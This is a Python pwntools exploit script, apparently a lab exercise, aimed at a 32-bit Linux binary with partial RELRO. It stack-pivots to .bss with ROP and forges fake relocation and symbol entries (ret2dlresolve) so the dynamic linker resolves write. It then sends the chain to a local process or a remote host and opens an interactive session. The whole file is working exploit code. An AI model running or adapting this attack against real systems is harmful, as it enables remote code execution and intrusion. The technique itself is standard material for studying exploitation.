from pwn import *
context(os="linux", arch="i386")

def debug_on():
	if (args.DEBUG):
		context.log_level = "debug"

g_fname = "./main_partial_relro_32"
g_elf = ELF(g_fname)

if (args.LOCAL):
	g_io = process(g_fname)
else:
	g_io = remote(args.HOST, int(args.PORT))

def getpid():
	if (args.LOCAL):
		log.info("pid:%d\n", g_io.proc.pid)
		pause()

def pwn():
	padding_len = 0x70	
	bss_addr = g_elf.bss()
	new_stk = bss_addr + 0x800 + (0x80487d8-0x80487a8) // 2 * 0x10 # *0x10 means * symobj_sz
	
	rop = ROP(g_elf)
	rop.raw('a' * padding_len)
	rop.read(0, new_stk, 0x100)
	rop.migrate(new_stk)
	getpid()
	g_io.send(rop.chain())

	plt0_addr = g_elf.get_section_by_name(".plt")["sh_addr"]
	rel_plt_addr = g_elf.get_section_by_name(".rel.plt")["sh_addr"]
	dynsym_addr = g_elf.get_section_by_name(".dynsym")["sh_addr"]
	
	# construct fake Elf32_Sym of write
	fake_symobj = flat(0x4c, 0, 0, 0x12)
	symobj_size = 0x10 # sizeof(Elf32_Sym) = 16 bytes.
	fake_symtab_addr = new_stk + 32
	fake_symtab_align = symobj_size - ((fake_symtab_addr - dynsym_addr) & 0xf)
	fake_symtab_addr += fake_symtab_align
	fake_symidx = (fake_symtab_addr - dynsym_addr) // symobj_size

	# construct fake Elf32_Rel of write
	r_offset = g_elf.got["write"]
	r_info = (fake_symidx << 8) | 0x7
	log.info("r_info=%#x\nndx_addr = %#x\n", r_info, 0x080482d8 + 0x2 * (r_info >> 8))
	fake_relobj = flat(r_offset, r_info)
	fake_reloc_addr = new_stk + 24
	fake_reloc_offset = fake_reloc_addr - rel_plt_addr

	rop = ROP(g_elf)
	rop.raw(plt0_addr)
	rop.raw(fake_reloc_offset)
	rop.raw(0xdeadbeef) # return address from write()

	sh = "/bin/sh\0"
	binsh_addr = new_stk + 48 + fake_symtab_align
	# write(1, binsh_addr, len(sh))
	rop.raw(1)
	rop.raw(binsh_addr)
	rop.raw(len(sh))

	# There are 6*4 bytes in rop.chain() before we insert fake_relobj
	rop.raw(fake_relobj) 

	# There are 8*4 bytes in rop.chain befoer we insert fake_symobj
	rop.raw('a' * fake_symtab_align)
	rop.raw(fake_symobj)
	rop.raw(sh)

	assert(len(rop.chain()) <= 0x100)
	g_io.send(rop.chain())
	
if ("__main__" == __name__):
	debug_on()
	pwn()
	g_io.interactive()
